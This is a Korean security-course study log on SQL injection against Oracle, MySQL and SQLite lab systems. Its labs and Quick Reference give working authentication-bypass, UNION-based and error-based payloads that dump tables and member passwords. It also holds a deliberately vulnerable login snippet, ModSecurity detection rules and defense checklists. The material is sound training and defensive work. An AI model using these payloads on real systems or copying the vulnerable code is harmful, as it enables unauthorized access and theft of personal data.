# 📄 2025.01.27 (Day 62) - SQL Injection 공격 기법

---

## 1. 핵심 개념 정리

### SQL Injection 기본 원리

| # | 핵심 개념 | 설명 | 실무/보안 관점 |
|:---:|:---|:---|:---|
| 1 | SQL Injection 정의 | 사용자 입력값을 통해 SQL 쿼리문을 조작하여 비정상적인 DB 접근을 시도하는 공격 기법 | 웹 애플리케이션 취약점 중 가장 위험도가 높은 공격 유형으로, OWASP Top 10에 지속적으로 포함됨 |
| 2 | 인증 우회 메커니즘 | 로그인 쿼리에 `or '1'='1'` 같은 항상 참인 조건을 삽입하여 인증 로직을 무력화 | 실제 계정 정보 없이도 관리자 권한 탈취 가능 |
| 3 | 주석 처리 공격 | `--` 또는 `/* */`를 사용해 쿼리의 나머지 부분을 무효화 | 비밀번호 검증 로직을 완전히 우회할 수 있어 매우 위험 |
| 4 | 쿼리 구조 파악 | 에러 메시지와 응답 패턴을 분석하여 백엔드 쿼리 구조를 역추적 | 공격자는 반복적인 시도를 통해 DB 스키마를 점진적으로 파악 |
| 5 | DBMS별 문법 차이 | Oracle, MySQL, SQLite 등 각 DBMS마다 주석, 함수, 메타데이터 테이블이 상이함 | 공격 탐지 시 사용된 문법을 통해 공격자의 타겟 DBMS를 역추적 가능 |

### Union-based SQL Injection

| # | 핵심 개념 | 설명 | 실무/보안 관점 |
|:---:|:---|:---|:---|
| 6 | Union 연산자 활용 | 정상 쿼리 결과와 공격 쿼리 결과를 합쳐서 출력 | 실무에서는 0.1% 수준으로 낮지만, 성공 시 대량의 데이터 탈취 가능 |
| 7 | 컬럼 개수 매칭 | `ORDER BY` 절을 이용해 원본 쿼리의 컬럼 개수를 파악 후, 동일한 개수로 Union 쿼리 구성 | 컬럼 개수 불일치 시 ORA-01789 에러 발생 |
| 8 | 자료형 일치 요구사항 | Oracle은 대응 컬럼의 자료형이 정확히 일치해야 하며, `null`로 시작해 하나씩 자료형 테스트 | MySQL은 자료형 검증이 느슨하나 Oracle은 엄격함 (ORA-01790 에러) |
| 9 | 메타데이터 테이블 활용 | `user_tables`, `user_tab_columns` (Oracle) 또는 `information_schema.tables` (MySQL)를 통해 DB 구조 파악 | 메타데이터 접근 권한이 있는 경우 전체 DB 스키마 노출 위험 |
| 10 | 단계적 데이터 탈취 | 테이블명 → 컬럼명 → 실제 데이터 순으로 점진적 정보 수집 | 각 단계마다 로그에 흔적이 남으므로 SIEM에서 연속된 패턴 탐지 가능 |

### Error-based SQL Injection

| # | 핵심 개념 | 설명 | 실무/보안 관점 |
|:---:|:---|:---|:---|
| 11 | 에러 메시지 유발 | 의도적으로 SQL 에러를 발생시켜 에러 메시지에 공격 쿼리 결과를 포함시킴 | 에러 메시지가 상세하게 노출되는 환경에서 효과적 |
| 12 | Oracle 특화 함수 악용 | `CTXSYS.DRITHSX.SN`, `ORDSYS.ORD_DICOM.GETMAPPINGXPATH` 등의 함수로 에러 메시지 내 데이터 노출 | Oracle 환경에서 특정 시스템 함수가 활성화된 경우 취약 |
| 13 | 서브쿼리 제약 조건 | 단일 행 반환 쿼리에 다중 행이 반환되면 ORA-01427 에러 발생 | `LIMIT 1` (MySQL) 또는 `ROWNUM=1` (Oracle)로 회피 가능 |
| 14 | 에러 패턴 분석 | 에러 코드와 메시지를 통해 DB 버전, 테이블 존재 여부, 데이터 타입 등을 파악 | 상세 에러 메시지 노출은 정보 유출의 시작점 |
| 15 | 단일 데이터 추출 | 한 번에 하나의 테이블/컬럼만 조회하며 반복적으로 공격 수행 | Union-based보다 느리지만 탐지 회피 가능성이 높음 |

---

## 2. 실습 내용 정리

### 실습 2-1: Oracle 기본 SQL Injection (인증 우회)

**목표:** 로그인 쿼리에 SQL Injection을 삽입하여 계정 정보 없이 인증 우회

**실습 환경:**
- 대상: Oracle 기반 웹 로그인 페이지
- 취약점: 사용자 입력값 검증 미흡
- 공격 벡터: 아이디 입력란

**실습 단계:**
```sql
# 1. 정상 쿼리 구조 파악
SELECT * FROM members WHERE id = '사용자입력' AND pw = '비밀번호입력';

# 2. 주석을 이용한 비밀번호 검증 우회
아이디: z_answer2@eqst.com' --
비밀번호: (아무거나)
# 결과 쿼리: SELECT * FROM members WHERE id = 'z_answer2@eqst.com' --' AND pw = '비번';

# 3. OR 조건을 이용한 전체 계정 조회
아이디: z_answer2@eqst.com' or '2'='2
# 결과 쿼리: SELECT * FROM members WHERE id = 'z_answer2@eqst.com' or '2'='2' AND pw = '비번';

# 4. 관리자 계정 타겟팅
아이디: admin' --
# 결과 쿼리: SELECT * FROM members WHERE id = 'admin' --' AND pw = '비번';

# 5. 항상 참인 조건으로 인증 우회
아이디: ' or '1'='1' --
# 결과: 데이터베이스의 첫 번째 계정으로 로그인 성공
```

**분석 포인트:**
```
확인 항목:
✓ 입력값이 쿼리에 직접 삽입되는지 확인 (Prepared Statement 미사용)
✓ 에러 메시지를 통해 쿼리 구조 유추 가능 여부
✓ 주석 처리 시 나머지 쿼리가 무효화되는지 확인
✓ 로그인 성공/실패 메시지의 차이를 통한 정보 수집
```

**보안 인사이트:**
- 사용자 입력값을 절대 신뢰하지 말고 Parameterized Query 사용 필수
- 에러 메시지를 클라이언트에게 상세히 노출하지 않도록 설정
- 로그인 실패 시 "아이디 또는 비밀번호가 틀렸습니다"와 같이 모호하게 처리하여 계정 존재 여부를 노출하지 않음

### 실습 2-2: Union-based SQL Injection (Oracle)

**목표:** Union 연산자를 이용해 메타데이터를 조회하고 개인정보 탈취

**실습 환경:**
- 대상: Oracle 기반 주소 검색 기능
- 취약점: 검색어 입력값 필터링 미흡
- 쿼리 구조: `SELECT 우편번호, 시, 구, 동, 기타 FROM 주소 WHERE 읍면동 LIKE '%검색어%'`

**실습 단계:**
```sql
# 1. 공격 포인트 확인
검색어: 삼성동%' union select null,null,null,null,null from dual where 'q%'='q

# 2. 컬럼 개수 파악
검색어: 삼성동%' order by 1 --  (성공)
검색어: 삼성동%' order by 5 --  (성공)
검색어: 삼성동%' order by 6 --  (ORA-01785 에러 발생)
→ 컬럼 개수: 5개

# 3. 자료형 확인
검색어: 삼성동%' union select 'ㄱ','ㄴ','ㄷ','ㄹ','ㅁ' from dual where 'q%'='q
→ 모두 문자형 확인

# 4. 테이블명 탈취
검색어: 삼성동%' union select table_name,null,null,null,null from user_tables where 'q%'='q
→ 결과: MEMBER, SQL_UNION_ANSWER 등 테이블 발견

# 5. MEMBER 테이블의 컬럼명 탈취
검색어: 삼성동%' union select column_name,'','','','' from user_tab_columns where table_name = 'MEMBER' or 'q%'='q
→ 결과: USER_NM, EMAIL, LOGIN_ID, PASS 컬럼 확인

# 6. 개인정보 탈취
검색어: 삼성동%' union select USER_NM, EMAIL, LOGIN_ID, PASS, '' from MEMBER where 'q%'='q
→ 결과: 전체 회원의 이름, 이메일, 아이디, 비밀번호 탈취 성공
```

**Union SQL Injection 원리:**
```
동작 방식:
1. 정상 쿼리의 결과 집합과 공격자가 삽입한 쿼리의 결과 집합을 Union으로 병합

2. 두 쿼리의 컬럼 개수와 자료형이 일치해야만 Union 연산 가능

3. 공격자는 `ORDER BY`를 통해 컬럼 개수를 먼저 파악한 후, `null` 값으로 자료형 테스트
```

**발견 가능한 민감 정보:**
- 데이터베이스 내 모든 테이블명과 컬럼 구조
- 사용자 계정 정보 (아이디, 비밀번호, 이메일, 전화번호)
- 관리자 계정 정보

**보안 고려사항:**
```
탐지 패턴:
- 'union', 'select', 'from', 'where' 등의 SQL 키워드가 연속으로 포함된 입력값
- user_tables, user_tab_columns, information_schema 같은 메타데이터 테이블 접근 로그
- 단일 요청에서 비정상적으로 많은 행이 반환되는 패턴

방어 방법:
→ Prepared Statement / Parameterized Query 사용으로 입력값과 쿼리 분리
→ 입력값 화이트리스트 검증 (특수문자 필터링)
→ 최소 권한 원칙: 웹 애플리케이션 DB 계정이 메타데이터 조회 권한을 갖지 않도록 설정
```

### 실습 2-3: MySQL Union SQL Injection

**목표:** MySQL 환경에서 `information_schema`를 활용한 테이블 및 컬럼 정보 탈취

**실습 환경:**
- 대상: MySQL 기반 주소 검색 시스템
- 취약점: LIKE 검색 구문에 입력값 직접 삽입
- DBMS 차이점: Oracle보다 자료형 검증이 느슨함

**실습 단계:**
```sql
# 1. 쿼리 구조 유추
SELECT 컬럼들 FROM 주소 WHERE 읍 LIKE '%검색어%'

# 2. 공격 포인트 확인
검색어: 삼성동%' or 'k'='k
→ 조건이 항상 참이 되어 전체 데이터 조회 가능

# 3. Union 제약사항 확인 (컬럼 개수)
검색어: 삼성동%' union select null, null, null, null, null from dual where 't%'='t
→ 5개 컬럼 확인

# 4. MySQL은 자료형 검증이 느슨하므로 바로 테이블명 탈취
검색어: 삼성동%' union select table_name,'','','','' from information_schema.tables where table_schema = database() and 't%'='t
→ 현재 데이터베이스의 모든 테이블명 노출

# 5. 컬럼명 탈취
검색어: 삼성동%' union select column_name,'','','','' from information_schema.columns where table_name = '타겟테이블명' and 't%'='t

# 6. 데이터 탈취
검색어: 삼성동%' union select 컬럼1, 컬럼2, 컬럼3, 컬럼4, 컬럼5 from 타겟테이블명 where 't%'='t
```

**MySQL vs Oracle 주요 차이:**
```
메타데이터 조회:
- Oracle: user_tables, user_tab_columns, all_tables
- MySQL: information_schema.tables, information_schema.columns

주석 처리:
- Oracle: -- (공백 필요), /* */
- MySQL: -- (공백 필요), #, /* */

자료형 검증:
- Oracle: 매우 엄격 (자료형 불일치 시 ORA-01790 에러)
- MySQL: 상대적으로 느슨 (자동 형변환 시도)

쿼리 제한:
- Oracle: ROWNUM 사용
- MySQL: LIMIT 구문 사용
```

### 실습 2-4: SQLite Union SQL Injection

**목표:** SQLite 환경에서 `sqlite_master` 테이블을 이용한 관리자 계정 탈취

**실습 환경:**
- 대상: http://192.168.0.156/ (SQLite 기반 친구 검색 시스템)
- 목표: 관리자 ID와 비밀번호 탈취
- 특이사항: SQLite는 `sqlite_master` 시스템 테이블에 모든 스키마 정보 저장

**실습 단계:**
```sql
# 1. 쿼리 구조 유추
SELECT 컬럼들 FROM 친구 WHERE 이름 LIKE '%검색어%'

# 2. 공격 포인트
검색어: 멍멍이%' union [공격쿼리] where '%o'='o

# 3. Union 제약사항 (컬럼 개수 및 자료형)
검색어: 멍멍이%' union select 'a','b',null,null,null where '%o'='o
→ 5개 컬럼, 앞 2개는 문자형

# 4. sqlite_master를 통한 테이블명 및 스키마 탈취
검색어: 멍멍이%' union select type, name, tbl_name, rootpage, sql from sqlite_master where 'o%'='o

→ 결과: 
type: table
name: member
tbl_name: member
sql: CREATE TABLE "member" ( "idx" INTEGER, "id" INTEGER UNIQUE, "name" INTEGER, "password" INTEGER, PRIMARY KEY("idx" AUTOINCREMENT) )

# 5. 컬럼명 확인
위의 sql 필드에서 이미 확인 완료: idx, id, name, password

# 6. 관리자 계정 데이터 탈취
검색어: 멍멍이%' union select idx, id, name, password, '' from member where 'o%'='o

→ 결과: 관리자 계정의 ID와 비밀번호 탈취 성공
```

**SQLite 특이사항:**
```
시스템 테이블:
- sqlite_master: 모든 테이블, 인덱스, 뷰의 CREATE 문을 포함
- 장점: 한 번의 쿼리로 전체 DB 스키마 파악 가능
- 단점: 보안 관점에서 매우 위험

자료형:
- INTEGER, TEXT, REAL, BLOB, NULL
- 동적 타이핑: 컬럼에 선언된 타입과 다른 타입도 저장 가능
```

### 실습 2-5: Error-based SQL Injection (Oracle)

**목표:** 에러 메시지를 이용하여 한 번에 하나씩 테이블 및 데이터 추출

**실습 환경:**
- 대상: Oracle 기반 검색 시스템
- 특징: Union이 불가능한 환경에서 에러 메시지로 데이터 추출
- 사용 함수: `CTXSYS.DRITHSX.SN`

**실습 단계:**
```sql
# 1. 쿼리 구조 유추
SELECT 컬럼들 FROM 테이블 WHERE name LIKE '%검색어%'

# 2. 공격 포인트 및 에러 유발 함수 삽입
검색어: 김%' and CTXSYS.DRITHSX.SN(user,('hacker'))='

→ 에러 메시지:
ORA-20000: Oracle Text 오류:
DRG-11701: hacker 키워드 사전이 존재하지 않습니다

# 3. 현재 사용자 확인
검색어: 김%' and CTXSYS.DRITHSX.SN(user,(select user from dual))='

→ 에러 메시지:
ORA-20000: Oracle Text 오류:
DRG-11701: RICHMAN 키워드 사전이 존재하지 않습니다
→ 현재 DB 사용자: RICHMAN

# 4. 테이블명 추출 (한 번에 하나씩)
검색어: 김%' and CTXSYS.DRITHSX.SN(user,(select table_name from user_tables where rownum=1))='

→ 에러 메시지에 첫 번째 테이블명 노출

# 5. 서브쿼리 제약 우회
다중 행이 반환되는 경우 ORA-01427 에러 발생
→ ROWNUM=1 또는 WHERE 조건으로 단일 행만 추출

# 6. 데이터 추출
검색어: 김%' and CTXSYS.DRITHSX.SN(user,(select password from member where id='admin'))='

→ 에러 메시지에 관리자 비밀번호 노출
```

**Error-based 공격 메커니즘:**
```
원리:
1. Oracle의 특정 시스템 함수는 파라미터로 전달된 문자열을 에러 메시지에 포함시킴

2. 서브쿼리 결과를 해당 함수의 파라미터로 전달

3. 함수 실행 실패 시 에러 메시지에 서브쿼리 결과가 노출됨

제약사항:
- 한 번에 하나의 행, 하나의 값만 추출 가능
- 반복적인 공격 필요 (느리지만 확실함)
```

**보안 고려사항:**
```
탐지 포인트:
- 에러 메시지 내 민감한 정보 (테이블명, 컬럼명, 데이터) 노출
- 동일한 IP에서 반복적으로 에러를 유발하는 패턴
- CTXSYS, ORDSYS, DBMS_ 등 시스템 스키마 함수 호출 로그

방어 방안:
→ 에러 메시지를 클라이언트에게 상세히 노출하지 않음 (일반화된 에러 페이지 제공)
→ Oracle 시스템 함수 실행 권한을 애플리케이션 계정에서 제거
→ WAF에서 CTXSYS, ORDSYS 등 특정 스키마 호출 시도 차단
```

---

## 3. DBMS별 SQL Injection 비교표

### Oracle vs MySQL vs SQLite 차이점

| 항목 | Oracle | MySQL | SQLite | 보안 분석가 관점 |
|:---:|:---|:---|:---|:---|
| **주석 처리** | `--` (공백 필요), `/* */` | `--` (공백 필요), `#`, `/* */` | `--` (공백 필요), `/* */` | MySQL의 `#` 주석은 URL 인코딩 문제로 탐지 회피에 자주 사용됨 |
| **메타데이터 조회** | `user_tables`, `user_tab_columns`, `all_tables` | `information_schema.tables`, `information_schema.columns` | `sqlite_master` (모든 스키마 한 번에 노출) | SQLite는 단 하나의 쿼리로 전체 DB 구조 파악 가능 |
| **자료형 검증** | 매우 엄격 (ORA-01790 에러) | 상대적으로 느슨 (자동 형변환) | 동적 타이핑 (타입 불일치 허용) | Oracle 환경에서는 자료형 테스트가 필수적이며, 로그에 명확히 남음 |
| **행 제한 구문** | `ROWNUM = 1` | `LIMIT 1` | `LIMIT 1` | Error-based 공격 시 단일 행 추출을 위해 필수적으로 사용됨 |
| **문자열 결합** | `||` 또는 `CONCAT` | `CONCAT` 또는 `||` (MySQL 8.0+) | `||` | 여러 컬럼을 하나로 합쳐 추출할 때 사용 |
| **Null 처리** | `null`, `''` (빈 문자열과 구분) | `null`, `''` (혼용 가능) | `null`, `''` (혼용 가능) | Union 쿼리 작성 시 자료형 맞추기 위해 활용 |

### SQL Injection 공격 유형별 특징

| 공격 유형 | 탐지 난이도 | 데이터 추출 속도 | 필요 조건 | 실무 적용 빈도 |
|:---|:---|:---|:---|:---|
| **Union-based** | 중간 | 빠름 (한 번에 대량 추출) | 쿼리 결과가 화면에 출력되어야 함 | 0.1% (최근 감소 추세) |
| **Error-based** | 낮음 | 느림 (한 번에 하나씩) | 에러 메시지가 상세히 노출되어야 함 | 에러 메시지 노출 설정이 여전히 많아 유효 |
| **Blind SQL Injection** | 높음 | 매우 느림 (참/거짓 판별만 가능) | 응답 시간 또는 참/거짓 차이만 확인 가능 | 높음 (실무에서 가장 흔함) |
| **Time-based** | 매우 높음 | 매우 느림 | 응답 시간 차이로만 판별 | 높음 (완전히 Blind 환경에서 사용) |

---

## 4. 심화 분석

### SQL Injection 공격 단계별 상세 분석

| 구분 | 탐지 및 정찰 | 쿼리 구조 파악 | 데이터 추출 | 보안 분석 포인트 |
|:---:|:---|:---|:---|:---|
| **1단계** | 입력란에 `'`, `"`, `)` 등 특수문자 입력 | 에러 메시지 또는 응답 차이 분석 | 성공적인 공격 벡터 확정 | WAF 우회 시도 패턴, 반복적인 에러 유발 |
| **2단계** | SQL 키워드 삽입 (`and`, `or`, `union`) | 주석 처리로 나머지 쿼리 무효화 | 컬럼 개수 및 자료형 파악 | `ORDER BY`, `null` 값 연속 시도 로그 |
| **3단계** | 항상 참인 조건 삽입 (`'1'='1'`) | 메타데이터 테이블 접근 시도 | 테이블명 및 컬럼명 탈취 | `user_tables`, `information_schema` 조회 로그 |
| **4단계** | Union 또는 Error-based 기법 선택 | 타겟 테이블 및 컬럼 선정 | 실제 민감 데이터 추출 | 비정상적으로 많은 행 반환 또는 특정 계정 반복 조회 |

### 공격 시나리오 및 방어 코드

```python
# [취약한 로그인 코드]
# 사용자 입력을 직접 쿼리에 삽입
login_id = request.POST.get('id')
password = request.POST.get('pw')

query = f"SELECT * FROM members WHERE id = '{login_id}' AND pw = '{password}'"
result = db.execute(query)

if result:
    # 로그인 성공
    session['user'] = result[0]
else:
    # 로그인 실패
    return "아이디 또는 비밀번호가 틀렸습니다"


# [공격 예시]
# 입력값: id = "admin' --", pw = "아무거나"
# 실행되는 쿼리:
# SELECT * FROM members WHERE id = 'admin' --' AND pw = '아무거나'
# 결과: 비밀번호 검증 없이 admin 계정으로 로그인 성공


# [방어 코드 - Prepared Statement 사용]
login_id = request.POST.get('id')
password = request.POST.get('pw')

# Parameterized Query (Placeholder 사용)
query = "SELECT * FROM members WHERE id = ? AND pw = ?"
result = db.execute(query, (login_id, password))

if result:
    session['user'] = result[0]
else:
    return "로그인에 실패했습니다"

# 설명:
# - 사용자 입력값은 쿼리 실행 시 '데이터'로만 취급되며 '코드'로 해석되지 않음
# - SQL Injection 공격 구문이 입력되어도 단순 문자열로 처리됨
```

---

## 5. 실무/보안 적용

### 보안 전문가 관점 - SQL Injection 탐지 및 대응

| 단계/유형 | 탐지 포인트 | 로그 예시 | 대응 방안 |
|:---:|:---|:---|:---|
| **초기 탐지** | - 입력란에 특수문자 (`'`, `"`, `-`, `;`) 포함<br>- SQL 키워드 (`select`, `union`, `and`, `or`) 연속 출현<br>- 주석 기호 포함 (`--`, `#`, `/* */`) | `GET /search?q=test%27+union+select` | - WAF Rule 업데이트로 SQL 키워드 패턴 차단<br>- 입력값 길이 및 특수문자 제한<br>- Rate Limiting으로 반복 시도 차단 |
| **메타데이터 접근** | - `user_tables`, `information_schema` 조회<br>- `sqlite_master` 접근<br>- 시스템 함수 호출 (`CTXSYS.*`, `ORDSYS.*`) | `SELECT table_name FROM user_tables`<br>`SELECT * FROM sqlite_master` | - DB 계정 권한 최소화 (메타데이터 조회 불필요)<br>- 시스템 스키마 함수 실행 권한 제거<br>- SIEM에서 메타데이터 조회 알림 생성 |
| **데이터 탈취 시도** | - 단일 요청에서 수백~수천 행 반환<br>- 민감 테이블 (`member`, `user`, `account`) 반복 조회<br>- Error-based 공격: 동일 IP에서 반복 에러 발생 | `SELECT user_nm, email, login_id, pass FROM member`<br>`ORA-20000 에러 5회 연속` | - 즉시 해당 세션 차단<br>- IP 블랙리스트 등록<br>- 침해사고 대응팀 즉시 알림<br>- 변조된 데이터 롤백 준비 |

### WAF 및 IPS 룰셋 예시

```bash
# ModSecurity (WAF) Rule 예시

# Rule 1: SQL Injection 키워드 탐지
SecRule ARGS "@rx (union|select|insert|update|delete|drop|alter|create|exec)" \
    "id:1001,phase:2,deny,status:403,msg:'SQL Injection Detected'"

# Rule 2: 주석 기호 탐지
SecRule ARGS "@rx (--|#|/\*|\*/)" \
    "id:1002,phase:2,deny,status:403,msg:'SQL Comment Character Detected'"

# Rule 3: 메타데이터 테이블 접근 탐지
SecRule ARGS "@rx (information_schema|user_tables|user_tab_columns|sqlite_master)" \
    "id:1003,phase:2,deny,status:403,msg:'Metadata Table Access Attempt'"

# Rule 4: Oracle 시스템 함수 호출 탐지
SecRule ARGS "@rx (CTXSYS|ORDSYS|DBMS_|UTL_)" \
    "id:1004,phase:2,deny,status:403,msg:'Oracle System Function Call Detected'"

# Rule 5: 과도하게 긴 입력값 차단
SecRule ARGS "@gt 200" \
    "id:1005,phase:2,deny,status:403,msg:'Input Length Exceeded'"
```

### 보안 설정 체크리스트

```bash
# 웹 애플리케이션 보안 설정

# 1. Prepared Statement 사용 여부 확인
# Java: PreparedStatement
# Python: parameterized queries (?, %s)
# PHP: PDO with placeholders

# 2. 에러 메시지 상세 정보 노출 차단
# 개발 환경: 상세 에러 메시지 표시 (디버깅용)
# 운영 환경: 일반화된 에러 페이지만 표시
display_errors = Off
error_reporting = E_ALL & ~E_NOTICE & ~E_WARNING

# 3. 입력값 검증 및 필터링
# 화이트리스트 방식: 허용된 문자만 통과
# 길이 제한: 필드별 최대 길이 설정

# 4. DB 계정 권한 최소화
# 웹 애플리케이션 전용 계정 생성
# SELECT, INSERT, UPDATE, DELETE만 허용
# DROP, ALTER, CREATE, GRANT 권한 제거
# 메타데이터 조회 권한 제거

# 5. WAF 및 IPS 룰셋 활성화
# SQL Injection 패턴 탐지 룰 적용
# 실시간 차단 및 알림 설정
```

---

## 6. 배운 점 및 인사이트

### 새로 알게 된 점

- **SQL Injection의 다양한 기법:** Union-based, Error-based 등 환경에 따라 공격 방식을 달리해야 하며, 각 DBMS마다 고유한 특성이 있음을 이해했습니다.
- **메타데이터의 중요성:** `user_tables`, `information_schema`, `sqlite_master` 같은 메타데이터 테이블이 공격자에게 얼마나 중요한 정보원인지, 그리고 이에 대한 접근 제어가 필수적임을 배웠습니다.
- **에러 메시지의 위험성:** 상세한 에러 메시지가 노출되면 공격자가 쿼리 구조를 파악하고 데이터를 추출할 수 있는 Error-based 공격이 가능해짐을 실습을 통해 직접 경험했습니다.
- **DBMS별 문법 차이의 실무적 의미:** Oracle의 엄격한 자료형 검증과 MySQL의 느슨한 검증 차이가 공격 난이도와 탐지 패턴에 직접적인 영향을 미친다는 점을 깨달았습니다.
- **Prepared Statement의 절대적 필요성:** 입력값 필터링만으로는 부족하며, 근본적으로 쿼리와 데이터를 분리하는 Parameterized Query가 필수임을 확인했습니다.

### 이전 학습과의 연결고리

- **Day 1 웹 보안 기초와 연계:** 웹 애플리케이션의 입력값 검증이 얼마나 중요한지, SQL Injection이라는 구체적인 공격 사례를 통해 실감할 수 있었습니다.
- **인증/인가 메커니즘 확장:** 로그인 우회 공격을 통해 식별-인증-인가 단계 중 인증 단계가 무력화될 수 있음을 학습했고, 다층 방어의 필요성을 느꼈습니다.
- **SIEM 로그 분석 관점 추가:** 이전에 배운 Wazuh, Splunk 같은 SIEM 도구로 SQL Injection 시도를 어떻게 탐지할 수 있을지 연결지어 생각해볼 수 있었습니다.

### 실무 적용 아이디어

**보안 전문가 관점:**
- **SIEM 룰 생성:** Wazuh나 Splunk에서 `union`, `select`, `information_schema` 같은 SQL 키워드가 웹 로그에 나타나는 패턴을 탐지하는 Custom Rule을 작성할 수 있겠습니다.
- **침해사고 대응 시나리오 구축:** SQL Injection 탐지 시 즉시 세션 차단, IP 블랙리스트 등록, 침해 범위 분석(어떤 데이터가 유출되었는지) 절차를 수립해야 합니다.
- **정기 취약점 점검 항목 추가:** 웹 애플리케이션의 모든 입력란에 대해 SQL Injection 테스트를 수행하고, Prepared Statement 사용 여부를 코드 리뷰로 확인하는 체크리스트를 만들 수 있습니다.

**보안 컨설턴트 관점:**
- **고객사 진단 시 우선순위 설정:** SQL Injection은 OWASP Top 10에 포함되는 고위험 취약점이므로, 웹 애플리케이션 진단 시 최우선으로 점검해야 합니다.
- **에러 메시지 노출 여부 확인:** 운영 환경에서 상세 에러 메시지가 노출되는지 확인하고, 노출 시 즉시 개선 권고를 해야 합니다.

---

## 7. Quick Reference

### SQL Injection 공격 명령어 모음

```sql
# 기본 인증 우회
' or '1'='1' --
' or '1'='1' /*
admin' --
admin' #

# 주석 처리 (Oracle)
-- (한 줄 주석, 뒤에 공백 필요)
/* 여러 줄 주석 */

# 주석 처리 (MySQL)
-- (한 줄 주석, 뒤에 공백 필요)
# (한 줄 주석, URL 인코딩: %23)
/* 여러 줄 주석 */

# Union SQL Injection 컬럼 개수 파악
' order by 1 --
' order by 5 --
' order by 10 --  (에러 발생 시 컬럼 개수 확인)

# Union 자료형 테스트
' union select null,null,null,null,null from dual --
' union select 'a','b','c','d','e' from dual --

# Oracle 메타데이터 조회
' union select table_name from user_tables --
' union select column_name from user_tab_columns where table_name='테이블명' --

# MySQL 메타데이터 조회
' union select table_name from information_schema.tables where table_schema=database() --
' union select column_name from information_schema.columns where table_name='테이블명' --

# SQLite 메타데이터 조회
' union select sql from sqlite_master --

# Error-based (Oracle)
' and CTXSYS.DRITHSX.SN(user,(select user from dual))=' --
' and CTXSYS.DRITHSX.SN(user,(select table_name from user_tables where rownum=1))=' --
```

### DBMS별 핵심 차이점 요약표

| 구분 | Oracle | MySQL | SQLite | 실무 탐지 키워드 |
|:---:|:---|:---|:---|:---|
| **메타데이터** | user_tables, user_tab_columns | information_schema.tables | sqlite_master | 로그에서 이 키워드 탐지 시 즉시 알림 |
| **주석** | `--`, `/* */` | `--`, `#`, `/* */` | `--`, `/* */` | URL에 `%23` (# 인코딩) 포함 시 의심 |
| **자료형 검증** | 엄격 | 느슨 | 매우 느슨 | Oracle은 ORA-01790 에러 빈발 |
| **행 제한** | ROWNUM | LIMIT | LIMIT | Error-based에서 단일 행 추출 용도 |

### SQL Injection 방어 체크리스트

**개발 단계:**
- [ ] 모든 사용자 입력값에 Prepared Statement 적용
- [ ] 입력값 화이트리스트 검증 (허용된 문자만 통과)
- [ ] 입력값 길이 제한 설정
- [ ] SQL 쿼리 로깅 활성화 (디버깅 및 분석용)

**인프라 단계:**
- [ ] WAF 룰셋 적용 (SQL Injection 패턴 차단)
- [ ] IPS/IDS 시그니처 업데이트
- [ ] DB 계정 권한 최소화 (SELECT, INSERT, UPDATE, DELETE만 허용)
- [ ] 메타데이터 조회 권한 제거

**운영 단계:**
- [ ] 에러 메시지 상세 정보 노출 차단 (일반화된 에러 페이지만 표시)
- [ ] SIEM에서 SQL Injection 탐지 룰 생성 및 알림 설정
- [ ] 정기 웹 애플리케이션 취약점 스캐닝
- [ ] 침해사고 대응 매뉴얼 수립 (SQL Injection 탐지 시 절차)

---

## 8. 트러블슈팅

| 문제 | 원인 | 해결 방법 |
|:---|:---|:---|
| Union 쿼리 실행 시 ORA-01789 에러 | 컬럼 개수 불일치 | - `ORDER BY` 절로 원본 쿼리의 컬럼 개수 정확히 파악<br>- Union 쿼리의 SELECT 항목 개수를 원본과 동일하게 맞춤<br>- `null` 값으로 부족한 컬럼 채우기 |
| Union 쿼리 실행 시 ORA-01790 에러 | 자료형 불일치 | - 먼저 모든 컬럼을 `null`로 설정하여 실행<br>- 하나씩 문자형 (`'a'`), 숫자형 (`1`), 날짜형 (`SYSDATE`)으로 변경하며 테스트<br>- MySQL은 자료형 검증이 느슨하므로 Oracle보다 수월 |
| Error-based 공격 시 ORA-01427 에러 | 서브쿼리가 다중 행 반환 | - `WHERE ROWNUM=1` 추가하여 단일 행만 추출<br>- `WHERE` 조건으로 특정 행 지정<br>- MySQL은 `LIMIT 1` 사용 |
| SQLite에서 테이블 구조 파악 어려움 | 메타데이터 조회 방법 모름 | - `sqlite_master` 테이블의 `sql` 컬럼 조회<br>- 한 번의 쿼리로 전체 CREATE TABLE 구문 확인 가능<br>- `' union select sql from sqlite_master --` |

---

**Today's Insight:**

SQL Injection은 단순히 입력값에 특수문자를 넣는 공격이 아니라, 데이터베이스의 구조를 이해하고 쿼리 문법을 정확히 알아야 성공할 수 있는 고도화된 공격 기법입니다. 특히 Union-based와 Error-based 기법은 각각 장단점이 뚜렷하며, 환경에 따라 적절한 기법을 선택해야 합니다. 보안 전문가로서 가장 중요한 교훈은 'Prepared Statement를 사용하면 대부분의 SQL Injection을 원천 차단할 수 있다'는 점과, 'SIEM을 통한 실시간 로그 모니터링으로 공격 초기 단계에서 탐지할 수 있다'는 점입니다. 오늘 학습한 다양한 DBMS별 차이점과 메타데이터 조회 기법은 향후 침해사고 대응 시 공격자의 의도를 파악하고 피해 범위를 분석하는 데 직접적으로 활용될 것입니다.